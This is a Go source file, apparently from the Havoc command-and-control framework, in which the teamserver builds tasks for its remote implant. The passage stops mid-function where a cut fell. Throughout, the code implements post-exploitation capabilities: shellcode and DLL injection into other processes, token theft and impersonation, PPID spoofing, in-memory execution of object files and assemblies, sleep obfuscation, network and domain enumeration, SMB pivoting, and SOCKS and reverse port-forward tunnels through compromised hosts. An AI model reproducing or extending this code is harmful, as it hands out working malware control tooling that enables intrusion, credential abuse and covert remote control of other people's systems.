package agent

import (
	"bytes"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"math/rand"
	"net"
	"strconv"
	"strings"
	"time"

	"Havoc/pkg/common"
	"Havoc/pkg/common/parser"
	"Havoc/pkg/logger"
	"Havoc/pkg/logr"
	"Havoc/pkg/socks"
	"Havoc/pkg/utils"
	"Havoc/pkg/win32"

	"github.com/olekukonko/tablewriter"
)

func (a *Agent) TeamserverTaskPrepare(Command string, Console func(AgentID string, Message map[string]string)) error {

	var Commands = strings.Split(Command, "::")

	switch Commands[0] {

	case "task":
		if len(Commands) > 1 {
			switch Commands[1] {

			case "list":
				if len(a.JobQueue) > 0 {
					var ListTable string

					ListTable += "\n"
					ListTable += fmt.Sprintf(" %-8s  %-19s  %-8s  %s\n", "Task ID", "Created", "Size", "Command")
					ListTable += fmt.Sprintf(" %-8s  %-19s  %-8s  %s\n", "-------", "-------", "----", "-------")

					for _, task := range a.JobQueue {
						var (
							Payload = BuildPayloadMessage([]Job{task}, a.Encryption.AESKey, a.Encryption.AESIv)
							Size    = common.ByteCountSI(int64(len(Payload)))
						)
						ListTable += fmt.Sprintf(" %-8s  %-19s  %-8s  %s\n", task.TaskID, task.Created, Size, task.CommandLine)
					}

					Console(a.NameID, map[string]string{
						"Type":    "Info",
						"Message": "List task queue:",
						"Output":  ListTable,
					})
				} else {
					Console(a.NameID, map[string]string{
						"Type":    "Error",
						"Message": "No jobs in task queue",
					})
				}
				break

			case "clear":
				if len(a.JobQueue) > 0 {
					var Jobs = len(a.JobQueue)
					a.JobQueue = nil
					Console(a.NameID, map[string]string{
						"Type":    "Good",
						"Message": fmt.Sprintf("Cleared task queue [%v]", Jobs),
					})
				} else {
					Console(a.NameID, map[string]string{
						"Type":    "Error",
						"Message": "No jobs in task queue",
					})
				}
				break

			}
		}
		break

	}

	return nil
}

func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string) (*Job, error) {
	var (
		job = &Job{
			Command: uint32(Command),
			Data:    []interface{}{},
			Created: time.Now().UTC().Format("02/01/2006 15:04:05"),
		}
		err error
	)

	Optional := Info.(map[string]interface{})

	if val, ok := Optional["CommandLine"]; ok {
		job.CommandLine = val.(string)
	}

	if val, ok := Optional["TaskID"]; ok {
		job.TaskID = val.(string)
	}

	switch Command {

	case COMMAND_EXIT:

		if val, ok := Optional["ExitMethod"].(string); ok {
			var Exit int = 0

			if val == "thread" {
				Exit = 1
			} else if val == "process" {
				Exit = 2
			}

			job.Data = []interface{}{
				Exit,
			}
		} else {
			return nil, errors.New("ExitMethod not found")
		}

		break

	case COMMAND_CHECKIN:
		break

	case COMMAND_SLEEP:
		var (
			Delay int
			err   error
		)

		if val, ok := Optional["Arguments"]; ok {

			Delay, err = strconv.Atoi(val.(string))
			if err != nil {
				return nil, err
			}

			job.Data = []interface{}{
				Delay,
			}

		} else {
			return nil, fmt.Errorf("no sleep delay specified: \"Arguments\" is not specified")
		}

	case COMMAND_FS:
		var (
			Arguments  = Optional["Arguments"].(string)
			SubCommand = 0
		)

		switch Optional["SubCommand"].(string) {
		case "dir":
			SubCommand = 1
			job.Data = []interface{}{
				SubCommand,
				win32.FALSE,
				common.EncodeUTF16(Arguments + "\\*"),
			}
			break

		case "dir;ui":
			SubCommand = 1
			job.Data = []interface{}{
				SubCommand,
				win32.TRUE,
				common.EncodeUTF16(Arguments + "\\*"),
			}
			break

		case "download":
			SubCommand = 2

			var (
				FileName []byte
				ArgArray []string
			)

			ArgArray = strings.Split(Arguments, ";")

			if val, err := base64.StdEncoding.DecodeString(ArgArray[0]); err == nil {
				FileName = []byte(common.EncodeUTF16(string(val)))
			} else {
				return nil, err
			}

			job.Data = []interface{}{
				SubCommand,
				FileName,
			}
			break

		case "upload":
			var (
				FileName []byte
				Content  []byte
				ArgArray []string
			)

			ArgArray = strings.Split(Arguments, ";")

			if val, err := base64.StdEncoding.DecodeString(ArgArray[0]); err == nil {
				FileName = append([]byte(common.EncodeUTF16(string(val))), []byte{0, 0}...)
			} else {
				return nil, err
			}

			if val, err := base64.StdEncoding.DecodeString(ArgArray[1]); err == nil {
				Content = val
			} else {
				return nil, err
			}

			SubCommand = 3
			job.Data = []interface{}{
				SubCommand,
				FileName,
				Content,
			}
			break

		case "cd":
			SubCommand = 4
			job.Data = []interface{}{
				SubCommand,
				common.EncodeUTF16(Arguments),
			}
			break

		case "remove":
			SubCommand = 5
			job.Data = []interface{}{
				SubCommand,
				common.EncodeUTF16(Arguments),
			}
			break

		case "mkdir":
			SubCommand = 6
			job.Data = []interface{}{
				SubCommand,
				common.EncodeUTF16(Arguments),
			}
			break

		case "cp":
			SubCommand = 7

			var Paths = strings.Split(Arguments, ";")
			if len(Paths) >= 2 {
				var (
					PathFrom []byte
					PathTo   []byte
				)

				if val, err := base64.StdEncoding.DecodeString(Paths[0]); err == nil {
					PathFrom = []byte(common.EncodeUTF16(string(val)))
				} else {
					return nil, err
				}

				if val, err := base64.StdEncoding.DecodeString(Paths[1]); err == nil {
					PathTo = []byte(common.EncodeUTF16(string(val)))
				} else {
					return nil, err
				}

				job.Data = []interface{}{
					SubCommand,
					PathFrom,
					PathTo,
				}
			}

			break

		case "pwd":
			SubCommand = 9
			job.Data = []interface{}{
				SubCommand,
			}
			break

		case "cat":
			SubCommand = 10

			var (
				FileName []byte
				ArgArray []string
			)

			ArgArray = strings.Split(Arguments, ";")

			if val, err := base64.StdEncoding.DecodeString(ArgArray[0]); err == nil {
				FileName = []byte(common.EncodeUTF16(string(val)))
			} else {
				return nil, err
			}

			job.Data = []interface{}{
				SubCommand,
				FileName,
			}
			break
		}

	case COMMAND_PROC:
		var (
			SubCommand, _ = strconv.Atoi(Optional["ProcCommand"].(string))
			Arguments     = Optional["Args"].(string)
		)

		switch SubCommand {
		case 2:
			var pid, _ = strconv.Atoi(Arguments)
			job.Data = []interface{}{
				SubCommand,
				pid,
			}
			break

		case 3:
			job.Data = []interface{}{
				SubCommand,
				Arguments,
			}
			break

		case 4:

			var (
				Args           = strings.Split(Arguments, ";")
				Process        any
				ProcessArgs    string
				ProcessState   int
				ProcessPiped   int
				ProcessVerbose int
			)

			// State, ProcessApp, Verbose, Piped, ProcessArg
			if len(Args) > 4 {
				ProcArgs, _ := base64.StdEncoding.DecodeString(Args[4])
				ProcessArgs = string(ProcArgs)
			}

			ProcessState, err := strconv.Atoi(Args[0])
			if err != nil {
				logger.Error("")
			}

			if len(Args[1]) != 0 {
				Process = Args[1]
			} else {
				Process = 0
			}

			ProcessVerbose = 0
			if strings.ToLower(Args[2]) == "true" {
				ProcessVerbose = 1
			}

			ProcessPiped = 0
			if strings.ToLower(Args[3]) == "true" {
				ProcessPiped = 1
			}

			job.Data = []interface{}{
				SubCommand,
				ProcessState,
				Process,
				ProcessArgs,
				ProcessPiped,
				ProcessVerbose,
			}

			break

		case 5:
			var State = 0
			if Optional["Args"] == "on" {
				State = 1
			}

			job.Data = []interface{}{
				SubCommand,
				State,
			}

			break

		case 6:
			var (
				Args        = strings.Split(Arguments, " ")
				QueryProtec int
			)

			var (
				ProcID, _ = strconv.Atoi(Args[0])
			)

			switch Args[1] {

			case "PAGE_NOACCESS":
				QueryProtec = win32.PAGE_NOACCESS

			case "PAGE_READONLY":
				QueryProtec = win32.PAGE_READONLY

			case "PAGE_READWRITE":
				QueryProtec = win32.PAGE_READWRITE

			case "PAGE_WRITECOPY":
				QueryProtec = win32.PAGE_WRITECOPY

			case "PAGE_EXECUTE":
				QueryProtec = win32.PAGE_EXECUTE

			case "PAGE_EXECUTE_READ":
				QueryProtec = win32.PAGE_EXECUTE_READ

			case "PAGE_EXECUTE_READWRITE":
				QueryProtec = win32.PAGE_EXECUTE_READWRITE

			case "PAGE_EXECUTE_WRITECOPY":
				QueryProtec = win32.PAGE_EXECUTE_WRITECOPY

			case "PAGE_GUARD":
				QueryProtec = win32.PAGE_GUARD
			}

			job.Data = []interface{}{
				SubCommand,
				ProcID,
				QueryProtec,
			}

			break

		case 7: // proc::kill
			var pid, err = strconv.Atoi(Arguments)
			if err != nil {
				logger.Debug("proc::kill failed to parse pid: " + err.Error())
				return nil, errors.New("proc::kill failed to parse pid: " + err.Error())
			} else {
				job.Data = []interface{}{
					SubCommand,
					pid,
				}
			}

			break
		}

		break

	case COMMAND_PROC_LIST:
		var (
			ProcessUI = Optional["FromProcessManager"].(string)
			Value     = win32.FALSE
		)

		if ProcessUI == "true" {
			Value = win32.TRUE
		}

		job.Data = []interface{}{
			Value,
		}

		break

	case COMMAND_PROC_PPIDSPOOF:
		var PPIDSpoof, err = strconv.Atoi(Optional["PPID"].(string))
		if err != nil {
			logger.Error(err)
			break
		}

		job.Data = []interface{}{
			uint32(PPIDSpoof),
		}

		break

	case COMMAND_INLINEEXECUTE:
		var (
			FunctionName string
			ObjectFile   []byte
			Parameters   []byte
			Flags        uint32
			ok           bool
		)

		if Arguments, ok := Optional["Arguments"].(string); ok {
			if Parameters, err = base64.StdEncoding.DecodeString(Arguments); !ok {
				return nil, errors.New("FunctionName not defined")
			}
		} else {
			return nil, errors.New("CoffeeLdr: Arguments not defined")
		}

		if Binary, ok := Optional["Binary"].(string); ok {
			if ObjectFile, err = base64.StdEncoding.DecodeString(Binary); err != nil {
				logger.Debug("Failed to turn base64 encoded object file into bytes: " + err.Error())
				return nil, err
			}
		}

		if FunctionName, ok = Optional["FunctionName"].(string); !ok {
			return nil, errors.New("CoffeeLdr: FunctionName not defined")
		}

		if ObjectFlags, ok := Optional["Flags"].(string); ok {

			switch strings.ToLower(ObjectFlags) {
			case "non-threaded":
				Flags = COFFEELDR_FLAG_NON_THREADED
				break

			case "threaded":
				Flags = COFFEELDR_FLAG_THREADED
				break

			case "default":
				Flags = COFFEELDR_FLAG_DEFAULT
				break

			default:
				Flags = 0
			}

		} else {
			return nil, errors.New("CoffeeLdr: Flags not defined")
		}

		job.Data = []interface{}{
			FunctionName,
			ObjectFile,
			Parameters,
			Flags,
		}

		break

	// TODO: make it more malleable/random values
	case COMMAND_ASSEMBLY_INLINE_EXECUTE:
		var (
			binaryDecoded, _ = base64.StdEncoding.DecodeString(Optional["Binary"].(string))
			arguments        = common.EncodeUTF16(Optional["Arguments"].(string))
			NetVersion       = common.EncodeUTF16("v4.0.30319")
			PipePath         = common.EncodeUTF16("\\\\.\\pipe\\mojo." + strconv.Itoa(rand.Intn(9999)) + "." + strconv.Itoa(rand.Intn(9999)) + "." + strconv.Itoa(rand.Intn(999999999999)) + strconv.Itoa(rand.Intn(9999999)))
			AppDomainName    = common.EncodeUTF16("DefaultDomain")
		)

		job.Data = []interface{}{
			PipePath,
			AppDomainName,
			NetVersion,
			binaryDecoded,
			arguments,
		}

	case COMMAND_ASSEMBLY_LIST_VERSIONS:
		break

	case COMMAND_SPAWNDLL:
		var (
			Binary, _ = base64.StdEncoding.DecodeString(Optional["Binary"].(string))
			Args, _   = base64.StdEncoding.DecodeString(Optional["Arguments"].(string))
		)

		job.Data = []interface{}{
			Binary,
			Args,
		}

		break

	case COMMAND_JOB:
		var (
			SubCommand int
			JobID      int
			err        error
		)

		if val, ok := Optional["Command"].(string); ok {
			switch val {
			case "list":
				SubCommand = 0x1
				break

			case "suspend":
				SubCommand = 0x2
				break

			case "resume":
				SubCommand = 0x3
				break

			case "kill":
				SubCommand = 0x4
				break
			}
		}

		if val, ok := Optional["Param"].(string); ok {
			JobID, err = strconv.Atoi(val)
			if err != nil {
				return job, errors.New("couldn't convert JobID to int")
			}
		}

		if SubCommand == 0x1 {
			job.Data = []interface{}{
				SubCommand,
			}
		} else {
			job.Data = []interface{}{
				SubCommand,
				JobID,
			}
		}

		break

	case COMMAND_INJECT_DLL:
		var (
			binaryDecoded, _ = base64.StdEncoding.DecodeString(Optional["Binary"].(string))
			TargetPID, _     = strconv.Atoi(Optional["PID"].(string))
			Param, _         = Optional["Arguments"].(string)
			InjectMethode    int
		)

		job.Data = []interface{}{
			InjectMethode, // Injection technique syscall
			TargetPID,
			binaryDecoded,
			Param,
		}
		break

	case COMMAND_INJECT_SHELLCODE:

		var (
			TargetArch int
			Argument   []byte
		)

		if val, ok := Optional["Way"]; ok {

			if val.(string) == "Inject" {
				Inject := 1
				Binary, err := base64.StdEncoding.DecodeString(Optional["Binary"].(string))
				if err != nil {
					return job, err
				}

				if _, ok := Optional["Argument"]; ok {
					args, err := base64.StdEncoding.DecodeString(Optional["Argument"].(string))
					if err != nil {
						return job, err
					}

					if len(args) > 0 {
						Argument = args
					}
				}

				TargetPid, err := strconv.Atoi(Optional["PID"].(string))
				if err != nil {
					return job, err
				}

				Technique, err := strconv.Atoi(Optional["Technique"].(string))
				if err != nil {
					return job, err
				}

				if Optional["Arch"] == "x64" {
					TargetArch = 2
				} else {
					TargetArch = 1
				}

				job.Data = []interface{}{
					Inject,
					Technique,
					TargetArch,
					Binary,
					Argument,
					TargetPid,
				}
			} else if val.(string) == "Spawn" {
				Inject := 0
				Binary, err := base64.StdEncoding.DecodeString(Optional["Binary"].(string))
				if err != nil {
					return job, err
				}

				if _, ok := Optional["Argument"]; ok {
					args, err := base64.StdEncoding.DecodeString(Optional["Argument"].(string))
					if err != nil {
						return job, err
					}

					if len(args) > 0 {
						Argument = args
					}
				}

				Technique, err := strconv.Atoi(Optional["Technique"].(string))
				if err != nil {
					return job, err
				}

				if Optional["Arch"] == "x64" {
					TargetArch = 2
				} else {
					TargetArch = 1
				}

				job.Data = []interface{}{
					Inject,
					Technique,
					TargetArch,
					Binary,
					Argument,
				}
			} else if val.(string) == "Execute" {
				Inject := 2
				Binary, err := base64.StdEncoding.DecodeString(Optional["Binary"].(string))
				if err != nil {
					return job, err
				}

				if _, ok := Optional["Argument"]; ok {
					args, err := base64.StdEncoding.DecodeString(Optional["Argument"].(string))
					if err != nil {
						return job, err
					}

					if len(args) > 0 {
						Argument = args
					}
				}

				Technique, err := strconv.Atoi(Optional["Technique"].(string))
				if err != nil {
					return job, err
				}

				if Optional["Arch"] == "x64" {
					TargetArch = 2
				} else {
					TargetArch = 1
				}

				job.Data = []interface{}{
					Inject,
					Technique,
					TargetArch,
					Binary,
					Argument,
				}
			} else {
				return job, errors.New("couldn't identify if injection or spawn is specified")
			}

		} else {
			return job, errors.New("inject option not specified")
		}

		break

	case COMMAND_TOKEN:
		var (
			SubCommand int
			Arguments  any
			err        error
		)

		if val, ok := Optional["SubCommand"].(string); ok {
			switch val {
			case "impersonate":
				SubCommand = 0x1

				if val, ok := Optional["Arguments"].(string); ok {
					Arguments, err = strconv.Atoi(val)
					if err != nil {
						return job, errors.New("Failed to convert TokenID to int: " + err.Error())
					}

					job.Data = []interface{}{
						SubCommand,
						Arguments.(int),
					}
				} else {
					return job, errors.New("token arguments not found")
				}

				break

			case "steal":
				SubCommand = 0x2

				if val, ok := Optional["Arguments"].(string); ok {
					Arguments, err = strconv.Atoi(val)
					if err != nil {
						return job, errors.New("Failed to convert TokenID to int: " + err.Error())
					}

					job.Data = []interface{}{
						SubCommand,
						Arguments.(int),
					}
				} else {
					return job, errors.New("token arguments not found")
				}

				break

			case "list":
				SubCommand = 0x3

				job.Data = []interface{}{
					SubCommand,
				}

				break

			case "privs-list":
				SubCommand = 0x4

				job.Data = []interface{}{
					SubCommand,
					win32.TRUE,
				}

				break

			case "privs-get":
				SubCommand = 0x4

				job.Data = []interface{}{
					SubCommand,
					win32.FALSE,
				}

				break

			case "make":
				SubCommand = 0x5

				if val, ok = Optional["Arguments"].(string); ok {

					var (
						Domain   []byte
						User     []byte
						Password []byte

						ArrayData []string
					)

					ArrayData = strings.Split(val, ";")

					if val, err := base64.StdEncoding.DecodeString(ArrayData[0]); err != nil {
						return job, errors.New("Failed to decode Domain: " + err.Error())
					} else {
						Domain = val
					}

					if val, err := base64.StdEncoding.DecodeString(ArrayData[1]); err != nil {
						return job, errors.New("Failed to decode User: " + err.Error())
					} else {
						User = val
					}

					if val, err := base64.StdEncoding.DecodeString(ArrayData[2]); err != nil {
						return job, errors.New("Failed to decode Password: " + err.Error())
					} else {
						Password = val
					}

					job.Data = []interface{}{
						SubCommand,
						Domain,
						User,
						Password,
					}

					logger.Debug(job.Data)

				} else {
					return job, errors.New("token arguments not found")
				}

				break

			case "getuid":
				SubCommand = 0x6

				job.Data = []interface{}{
					SubCommand,
				}

				break

			case "revert":
				SubCommand = 0x7

				job.Data = []interface{}{
					SubCommand,
				}

				break

			case "remove":
				SubCommand = 0x8

				if val, ok := Optional["Arguments"].(string); ok {
					Arguments, err = strconv.Atoi(val)
					if err != nil {
						return job, errors.New("Failed to convert TokenID to int: " + err.Error())
					}

					job.Data = []interface{}{
						SubCommand,
						Arguments.(int),
					}
				} else {
					return job, errors.New("token arguments not found")
				}

				break

			case "clear":
				SubCommand = 0x9

				job.Data = []interface{}{
					SubCommand,
				}

				break
			}
		}
		break

	case COMMAND_CONFIG:

		var (
			ConfigKey = Optional["ConfigKey"]
			ConfigVal = Optional["ConfigVal"]

			ConfigId int
			Value    any
		)

		switch ConfigKey {

		case "implant.verbose":
			ConfigId = CONFIG_IMPLANT_VERBOSE

			if ConfigVal == "true" {
				Value = 1
			} else {
				Value = 0
			}

			break

		case "implant.sleep-obf.start-addr":
			ConfigId = CONFIG_IMPLANT_SPFTHREADSTART

			var (
				Library   = strings.Split(ConfigVal.(string), "!")[0]
				Function  = strings.Split(ConfigVal.(string), "!")[1]
				OffsetStr = strings.Split(ConfigVal.(string), "+")[1]
			)

			OffsetStr = strings.Replace(OffsetStr, "0x", "", -1)
			Offset, err := strconv.ParseInt(OffsetStr, 16, 64)

			if err != nil {
				logger.Error("Failed to convert hex string to int: " + err.Error())
			}

			Function = strings.Split(Function, "+")[0]

			job.Data = []interface{}{
				ConfigId,
				Library,
				Function,
				Offset,
			}

			break

		case "implant.sleep-obf.technique":
			ConfigId = CONFIG_IMPLANT_SLEEP_TECHNIQUE

			var Num, err = strconv.Atoi(ConfigVal.(string))
			if err != nil {
				logger.Error("Failed to convert string to num: " + err.Error())
			}

			job.Data = []interface{}{
				ConfigId,
				Num,
			}

		case "implant.coffee.veh":
			ConfigId = CONFIG_IMPLANT_COFFEE_VEH

			if ConfigVal == "true" {
				Value = 1
			} else {
				Value = 0
			}
			break

		case "implant.coffee.threaded":
			ConfigId = CONFIG_IMPLANT_COFFEE_THREADED

			if ConfigVal == "true" {
				Value = 1
			} else {
				Value = 0
			}

			break

		case "memory.alloc":
			ConfigId = CONFIG_MEMORY_ALLOC
			Value, _ = strconv.Atoi(ConfigVal.(string))

			break

		case "memory.execute":
			ConfigId = CONFIG_MEMORY_EXECUTE
			Value, _ = strconv.Atoi(ConfigVal.(string))
			break

		case "inject.technique":
			ConfigId = CONFIG_INJECT_TECHNIQUE
			Value, _ = strconv.Atoi(ConfigVal.(string))
			break

		case "inject.spoofaddr":
			ConfigId = CONFIG_INJECT_SPOOFADDR

			var (
				Library   = strings.Split(ConfigVal.(string), "!")[0]
				Function  = strings.Split(ConfigVal.(string), "!")[1]
				OffsetStr = strings.Split(ConfigVal.(string), "+")[1]
			)

			OffsetStr = strings.Replace(OffsetStr, "0x", "", -1)
			Offset, err := strconv.ParseInt(OffsetStr, 16, 64)

			if err != nil {
				logger.Error("Failed to convert hex string to int: " + err.Error())
			}

			Function = strings.Split(Function, "+")[0]

			job.Data = []interface{}{
				ConfigId,
				Library,
				Function,
				Offset,
			}
			break

		case "inject.spawn64":
			ConfigId = CONFIG_INJECT_SPAWN64
			Value = ConfigVal
			break

		case "inject.spawn32":
			ConfigId = CONFIG_INJECT_SPAWN32
			Value = ConfigVal
			break
		}

		if len(job.Data) == 0 {
			job.Data = []interface{}{
				ConfigId,
				Value,
			}
		}

		break

	case COMMAND_SCREENSHOT:
		break

	case COMMAND_NET:
		var (
			NetCommand int
			Param      string
		)

		if val, ok := Optional["NetCommand"]; ok {
			NetCommand, err = strconv.Atoi(val.(string))
			if err != nil {
				logger.Debug("Failed to parse net command: " + err.Error())
				return nil, err
			}
		} else {
			return nil, errors.New("command::net NetCommand not defined")
		}

		if val, ok := Optional["Param"]; ok {
			Param = val.(string)
		} else {
			return nil, errors.New("command::net param not defined")
		}

		switch NetCommand {
		case DEMON_NET_COMMAND_DOMAIN:
			job.Data = []interface{}{
				NetCommand,
			}
			break

		case DEMON_NET_COMMAND_LOGONS:
			var Target = common.EncodeUTF16(Param)
			job.Data = []interface{}{
				NetCommand,
				Target,
			}
			break

		case DEMON_NET_COMMAND_SESSIONS:
			var Target = common.EncodeUTF16(Param)
			job.Data = []interface{}{
				NetCommand,
				Target,
			}
			break

		case DEMON_NET_COMMAND_COMPUTER:
			var Target = common.EncodeUTF16(Param)
			job.Data = []interface{}{
				NetCommand,
				Target,
			}
			break

		case DEMON_NET_COMMAND_DCLIST:
			var Target = common.EncodeUTF16(Param)
			job.Data = []interface{}{
				NetCommand,
				Target,
			}
			break

		case DEMON_NET_COMMAND_SHARE:
			var Target = common.EncodeUTF16(Param)
			job.Data = []interface{}{
				NetCommand,
				Target,
			}
			break

		case DEMON_NET_COMMAND_LOCALGROUP:
			var Target = common.EncodeUTF16(Param)
			job.Data = []interface{}{
				NetCommand,
				Target,
			}
			break

		case DEMON_NET_COMMAND_GROUP:
			job.Data = []interface{}{
				NetCommand,
				Param,
			}
			break

		case DEMON_NET_COMMAND_USERS:
			var Target = common.EncodeUTF16(Param)
			job.Data = []interface{}{
				NetCommand,
				Target,
			}
			break

		default:

		}

		break

	case COMMAND_PIVOT:
		var (
			PivotCommand int
			Param        string
		)

		if val, ok := Optional["Param"]; ok {
			Param = val.(string)
		}

		if val, ok := Optional["Command"]; ok {

			if val, err := strconv.Atoi(val.(string)); err != nil {
				logger.Debug("failed to convert pivot command to int: " + err.Error())
				return nil, errors.New("failed to convert pivot command to int: " + err.Error())
			} else {
				PivotCommand = val
			}

		}

		switch PivotCommand {
		case DEMON_PIVOT_LIST:
			job.Data = []interface{}{
				PivotCommand,
			}

		case DEMON_PIVOT_SMB_CONNECT:
			job.Data = []interface{}{
				PivotCommand,
				common.EncodeUTF16(Param),
			}

			break

		case DEMON_PIVOT_SMB_DISCONNECT:
			var AgentID, err = strconv.ParseInt(Param, 16, 32)
			if err != nil {
				return nil, err
			}

			job.Data = []interface{}{
				PivotCommand,
				AgentID,
			}
			break

		case DEMON_PIVOT_SMB_COMMAND:
			job.Data = []interface{}{
				PivotCommand,
			}
			break
		}

		break

	case COMMAND_TRANSFER:
		var (
			SubCommand string
			Param      string
			FileID     int64
		)

		if val, ok := Optional["Command"]; ok {
			SubCommand = val.(string)
		} else {
			return job, errors.New("transfer field Command is empty.")
		}

		if val, ok := Optional["FileID"]; ok {
			Param = val.(string)
		} else {
			return job, errors.New("transfer field FileID is empty.")
		}

		switch SubCommand {
		case "list":
			job.Data = []interface{}{
				0x0,
			}
			break

		case "stop":
			FileID, err = strconv.ParseInt(Param, 16, 32)
			if err != nil {
				return nil, err
			}

			job.Data = []interface{}{
				0x1,
				FileID,
			}
			break

		case "resume":
			FileID, err = strconv.ParseInt(Param, 16, 32)
			if err != nil {
				return nil, err
			}

			job.Data = []interface{}{
				0x2,
				FileID,
			}
			break

		case "remove":
			FileID, err = strconv.ParseInt(Param, 16, 32)
			if err != nil {
				return nil, err
			}

			job.Data = []interface{}{
				0x3,
				FileID,
			}
			break
		}

		break

	case COMMAND_SOCKET:
		var (
			SubCommand string
			Param      string
		)

		if val, ok := Optional["Command"]; ok {
			SubCommand = val.(string)
		} else {
			return job, errors.New("socket field Command is empty")
		}

		if val, ok := Optional["Params"]; ok {
			Param = val.(string)
		} else {
			return job, errors.New("socket field param is empty")
		}

		switch SubCommand {
		case "rportfwd add":
			var (
				Params  []string
				LclAddr = 0
				LclPort = 0
				FwdAddr = 0
				FwdPort = 0
			)

			/* LclAddr; LclPort; FwdAddr; FwdPort */
			Params = strings.Split(Param, ";")
			if len(Param) < 4 {
				return nil, fmt.Errorf("rportfwd requieres 4 arguments, received %d", len(Params))
			}

			/* Parse local host & port arguments */
			LclAddr, err = common.IpStringToInt32(Params[0])
			if err != nil {
				return nil, err
			}

			LclPort, err = strconv.Atoi(Params[1])
			if err != nil {
				return nil, err
			}

			/* Parse forward host & port arguments */
			FwdAddr, err = common.IpStringToInt32(Params[2])
			if err != nil {
				return nil, err
			}

			FwdPort, err = strconv.Atoi(Params[3])
			if err != nil {
				return nil, err
			}

			job.Data = []interface{}{
				SOCKET_COMMAND_RPORTFWD_ADD,
				LclAddr,
				LclPort,
				FwdAddr,
				FwdPort,
			}

			break

		case "rportfwd list":
			job.Data = []interface{}{
				SOCKET_COMMAND_RPORTFWD_LIST,
			}

			break

		case "rportfwd remove":
			var SocketID int

			SocketID, err = strconv.Atoi(Param)
			if err != nil {
				return nil, err
			}

			job.Data = []interface{}{
				SOCKET_COMMAND_RPORTFWD_REMOVE,
				SocketID,
			}
			break

		case "rportfwd clear":
			job.Data = []interface{}{
				SOCKET_COMMAND_RPORTFWD_CLEAR,
			}
			break

		case "socks add":

			var Socks *socks.Socks

			Socks = socks.NewSocks("0.0.0.0:" + Param)
			if Socks == nil {
				return nil, errors.New("failed to create a new socks4a instance")
			}

			Socks.SetHandler(func(s *socks.Socks, conn net.Conn) {

				var (
					ConnectJob  Job
					SocksHeader socks.SocksHeader
					err         error
					SocketId    int32
				)

				SocksHeader, err = socks.ReadSocksHeader(conn)
				if err != nil {
					if err != io.EOF {
						logger.Error("Failed to read socks header: " + err.Error())
						return
					}
				}

				/* generate some random socket id */
				SocketId = rand.Int31n(0x10000)

				s.Clients = append(s.Clients, SocketId)

				a.SocksClientAdd(SocketId, conn)

				/* now parse the host:port and send it to the agent. */
				ConnectJob = Job{
					Command: COMMAND_SOCKET,
					Data: []any{
						SOCKET_COMMAND_CONNECT,
						SocketId,
						SocksHeader.Port,
						SocksHeader.IP,
						SocksHeader.Domain,
					},
				}

				a.AddJobToQueue(ConnectJob)

				/* goroutine to read from socks proxy socket and send it to the agent */
				go func(SocketId int) {

					for {

						/* check if the connection is still up */
						if client := a.SocksClientGet(SocketId); client != nil {

							if !client.Connected {
								/* if we are still not connected then skip */
								continue
							}

							if Data, err := a.SocksClientRead(SocketId); err == nil {

								/* only send the data if there is something... */
								if len(Data) > 0 {

									/* make a new job */
									var job = Job{
										Command: COMMAND_SOCKET,
										Data: []any{
											SOCKET_COMMAND_READ_WRITE,
											client.SocketID,
											Data,
										},
									}

									/* append the job to the task queue */
									a.AddJobToQueue(job)

								}

							} else {

								if err != io.EOF {

									/* we failed to read from the socks proxy */
									logger.Error(fmt.Sprintf("Failed to read from socket %x: %v", client.SocketID, err))

									a.SocksClientClose(SocketId)

									/* make a new job */
									var job = Job{
										Command: COMMAND_SOCKET,
										Data: []any{
											SOCKET_COMMAND_CLOSE,
											client.SocketID,
										},
									}

									/* append the job to the task queue */
									a.AddJobToQueue(job)

								}

								break
							}

						} else {
							/* seems like it has been removed. let's exit this routine */

							break
						}

					}

				}(int(SocketId))

			})

			/* TODO: append the socket to a list/array now */
			a.SocksSvr = append(a.SocksSvr, &SocksServer{
				Server: Socks,
				Addr:   Param,
			})

			go func() {
				err := Socks.Start()
				if err != nil {
					Socks.Failed = true
					if Message != nil {
						*Message = map[string]string{
							"Type":    "Error",
							"Message": fmt.Sprintf("Failed to start socks proxy: %v", err),
							"Output":  "",
						}
					}
					return
				}
			}()

			if Message != nil {
				if !Socks.Failed {

					*Message = map[string]string{
						"Type":    "Good",
						"Message": fmt.Sprintf("Started socks4a server on port %v", Param),
						"Output":  "",
					}
				}
			}

			return nil, nil

		case "socks list":

			var Output string

			Output += fmt.Sprintf("\n")
			Output += fmt.Sprintf(" Port \n")
			Output += fmt.Sprintf(" ---- \n")

			for _, server := range a.SocksSvr {

				Output += fmt.Sprintf(" %s \n", server.Addr)

			}

			if Message != nil {
				*Message = map[string]string{
					"Type":    "Info",
					"Message": "Socks proxy server: ",
					"Output":  Output,
				}
			}

			return nil, nil

		case "socks kill":

			/* TODO: send a queue of tasks to kill every socks proxy client that uses this proxy */
			var found = false

			for i := range a.SocksSvr {

				if a.SocksSvr[i].Addr == Param {

					/* alright we found it */
					found = true

					/* close the server */
					a.SocksSvr[i].Server.Close()

					/* close every connection that the agent has with this socks proxy */
					for client := range a.SocksSvr[i].Server.Clients {

						/* close the client connection */
						a.SocksClientClose(client)

						/* make a new job */
						var job = Job{
							Command: COMMAND_SOCKET,
							Data: []any{
								SOCKET_COMMAND_CLOSE,
								client,
							},
						}

						/* append the job to the task queue */
						a.AddJobToQueue(job)

					}

					/* remove the socks server from the array */
					a.SocksSvr = append(a.SocksSvr[:i], a.SocksSvr[i+1:]...)

					break
				}

			}

			if found {

				if Message != nil {
					*Message = map[string]string{
						"Type":    "Info",
						"Message": "Closed socks proxy " + Param,
					}
				}

			} else {

				if Message != nil {
					*Message = map[string]string{
						"Type":    "Info",
						"Message": "Failed to find and close socks proxy " + Param,
					}
				}

			}

			return nil, nil

		case "socks clear":

			/* TODO: send a queue of tasks to kill every socks proxy client that uses this proxy */

			for i := range a.SocksSvr {

				/* close the server */
				a.SocksSvr[i].Server.Close()

				/* close every connection that the agent has with this socks proxy */
				for client := range a.SocksSvr[i].Server.Clients {

					/* close the client connection */
					a.SocksClientClose(client)

					/* make a new job */
					var job = Job{
						Command: COMMAND_SOCKET,
						Data: []any{
							SOCKET_COMMAND_CLOSE,
							client,
						},
					}

					/* append the job to the task queue */
					a.AddJobToQueue(job)

				}

				/* remove the socks server from the array */
				a.SocksSvr = append(a.SocksSvr[:i], a.SocksSvr[i+1:]...)

			}

			if Message != nil {
				*Message = map[string]string{
					"Type":    "Info",
					"Message": "Successfully closed all socks proxies " + Param,
				}
			}

			return nil, nil
		}

		break

	default:
